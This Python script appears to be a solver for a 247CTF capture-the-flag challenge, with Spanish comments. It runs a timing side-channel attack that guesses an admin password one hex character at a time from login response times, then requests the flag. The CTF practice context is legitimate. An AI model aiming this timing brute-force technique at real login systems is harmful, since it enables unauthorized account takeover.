#!/usr/bin/env python3
import requests
import time
import statistics
import sys

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

iteration = 0
while True:
    iteration += 1
    api_token = get_token()
    
    # Estrategia adaptativa: 
    # Primeras iteraciones: descubrir con 1 medición (8 posiciones)
    # Luego: refinar con más mediciones las posiciones dudosas
    
    if iteration == 1:
        measurements_per_char = 1
        positions = 8
    elif iteration == 2:
        measurements_per_char = 2  
        positions = 4
    else:
        measurements_per_char = 4
        positions = 2
    
    known = ""
    total_requests = 0
    
    for pos in range(min(positions, 32)):
        all_timings = {char: [] for char in HEX_CHARS}
        
        for m in range(measurements_per_char):
            for char in HEX_CHARS:
                if total_requests >= 120:
                    break
                    
                test_pw = known + char + "0" * (31 - len(known))
                result, elapsed = try_login(test_pw, api_token)
                all_timings[char].append(elapsed)
                total_requests += 1
                
                if result.get("result") == "success":
                    flag_result = get_flag(test_pw)
                    print(flag_result.get("flag", flag_result), flush=True)
                    sys.exit(0)
            
            if total_requests >= 120:
                break
        
        # Usar promedio
        char_avgs = {char: sum(times)/len(times) if times else 0 
                     for char, times in all_timings.items()}
        best_char = max(char_avgs.items(), key=lambda x: x[1])[0]
        known += best_char
    
    # Probar la contraseña construida hasta ahora (rellenando con patrón)
    # Probar diferentes patrones para los caracteres faltantes
    if len(known) < 32:
        for fill_pattern in ["0", "f", "a", known[0] if known else "0"]:
            test_pw = known + fill_pattern * (32 - len(known))
            flag_result = get_flag(test_pw)
            if "flag" in str(flag_result).lower():
                print(flag_result.get("flag", flag_result), flush=True)
                sys.exit(0)
    else:
        flag_result = get_flag(known)
        if "flag" in str(flag_result).lower():
            print(flag_result.get("flag", flag_result), flush=True)
            sys.exit(0)
